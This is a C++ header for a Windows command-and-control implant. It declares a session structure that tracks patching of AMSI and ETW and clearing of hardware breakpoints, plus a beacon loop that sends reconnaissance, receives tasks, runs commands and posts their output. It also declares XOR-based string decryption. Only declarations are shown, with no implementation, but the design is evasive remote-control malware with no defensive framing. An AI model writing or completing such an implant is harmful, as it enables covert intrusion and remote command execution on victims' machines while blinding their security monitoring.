#pragma once
#include <windows.h>
#include <string>
#include <vector>

// C2 session data
struct Session {
    std::wstring sessionId;   // hex hash of hostname|username
    std::wstring hostname;
    std::wstring username;
    DWORD build;
    BOOL elevated;
    BOOL amsiPatched;
    BOOL etwPatched;
    BOOL hwbpsCleared;
};

// Beacon loop: send recon, receive task, execute, send result
VOID BeaconLoop();

// Send JSON beacon to /beacon
BOOL SendBeacon(const Session& session, std::wstring& taskOut);

// Execute command (cmd string) and return output
std::wstring ExecuteCommand(const std::wstring& cmd);

// Post result to /result
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);

// Encrypt/decrypt strings with hostname hash (XOR)
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key);